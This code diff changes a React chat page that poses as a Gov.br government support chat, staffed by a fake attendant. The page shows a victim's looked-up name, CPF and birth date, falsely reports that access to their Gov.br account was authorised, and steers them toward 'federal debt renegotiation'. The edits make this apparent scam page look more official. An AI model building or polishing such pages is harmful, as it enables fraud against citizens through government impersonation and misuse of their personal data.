@@ -252,20 +252,18 @@ function ChatPage() {
     addMessage({ id: "5", type: "system", content: "<em><strong>(Atendente Letícia entrou na conversa..)</strong></em> 💬" });
 
     if (data && (data.status === 200 || data.status === "200")) {
+      const htmlConfirme = `Para continuar, confirme seus dados<br/>cadastrados no sistema:
+<div class="mt-3 border border-[#f0f0f0] rounded-xl p-3.5 bg-white shadow-[0_2px_4px_rgba(0,0,0,0.02)]">
+  <div class="text-[10px] font-bold text-[#999] uppercase tracking-wider">NOME COMPLETO:</div>
+  <div class="text-[14px] font-bold text-[#1351B4] mb-3 uppercase">${data.nome}</div>
+  <div class="text-[10px] font-bold text-[#999] uppercase tracking-wider">DOCUMENTO CPF:</div>
+  <div class="text-[14px] font-bold text-[#1351B4] mb-3">${formatCpf(data.cpf)}</div>
+  <div class="text-[10px] font-bold text-[#999] uppercase tracking-wider">DATA DE NASCIMENTO:</div>
+  <div class="text-[14px] font-bold text-[#1351B4]">${data.nascimento}</div>
+</div>`;
+      
       await simulateTypingByLength(120);
-      addMessage({
-        id: "6",
-        type: "info",
-        infoLines: [
-          { text: "Para continuar, confirme seus dados:", style: "bold" },
-          { text: "Nome:", style: "bold" },
-          { text: data.nome, style: "value" },
-          { text: "CPF:", style: "bold" },
-          { text: formatCpf(data.cpf), style: "value" },
-          { text: "Nascimento:", style: "bold" },
-          { text: data.nascimento, style: "value" },
-        ]
-      });
+      addMessage({ id: "6", type: "bot", content: htmlConfirme });
 
       const answer = await waitButtons("6-btn", ["Sim, está correto.", "Não sou eu"]);
       if (answer === "Sim, está correto.") {
@@ -284,11 +282,15 @@ function ChatPage() {
   };
 
   const continueFlow = async (data: CpfData) => {
-    await botSay("c1", "Obrigada!");
-    await botSay("c2", "Aguarde... Entrando em sua conta Gov.br");
-    await botSay("c3", "<strong>Login efetuado com sucesso!</strong>");
-    await botSay("c4", `<strong>${data.nome}</strong><br/>Seja bem vindo(a) a sua conta Gov.br`);
-    await botSay("c5", "Negocie dívidas com as seguintes empresas:");
+    await botSay("c1", "Obrigada pela confirmação.");
+    await botSay("c2", "Aguarde um momento... Localizando sua conta Gov.br");
+    await botSay("c3", "<strong>Acesso autorizado com sucesso!</strong>");
+    await botSay("c4", `
+<div class="text-[11px] font-bold text-[#1351B4] uppercase tracking-wider mb-1">PORTAL DE RENEGOCIAÇÃO FEDERAL</div>
+<div class="text-[18px] font-extrabold text-[#111] leading-tight mb-1 uppercase">${data.nome}</div>
+<div class="text-[12px] text-[#666]">Sessão iniciada em sua conta Gov.br</div>
+`);
+    await botSay("c5", "Identificamos pendências com as seguintes instituições parceiras:");
     addMessage({ id: "c6", type: "bot", image: image2.url });
 
     await waitButtons("c7", ["CONTINUAR"]);
@@ -575,12 +577,12 @@ function ChatPage() {
             )}
 
             {msg.type === "typing" && msg.buttons && (
-              <div className="flex flex-wrap gap-2.5 justify-end w-full mt-1.5">
+              <div className="flex flex-col gap-2.5 w-full mt-1.5 px-4 mb-2">
                 {msg.buttons.map((btn) => (
                   <button
                     key={btn}
                     onClick={() => handleButtonClick(msg.id, btn)}
-                    className="bg-white border-2 border-[#1351B4] text-[#1351B4] rounded-[22px] p-[10px_18px] text-sm font-medium cursor-pointer hover:bg-[#1351B4] hover:text-white transition-colors shadow-sm"
+                    className="bg-white border border-[#1351B4] text-[#1351B4] rounded-lg py-3 px-4 text-sm font-bold uppercase w-full text-center hover:bg-[#f0f4ff] transition-colors shadow-sm"
                   >
                     {btn}
                   </button>
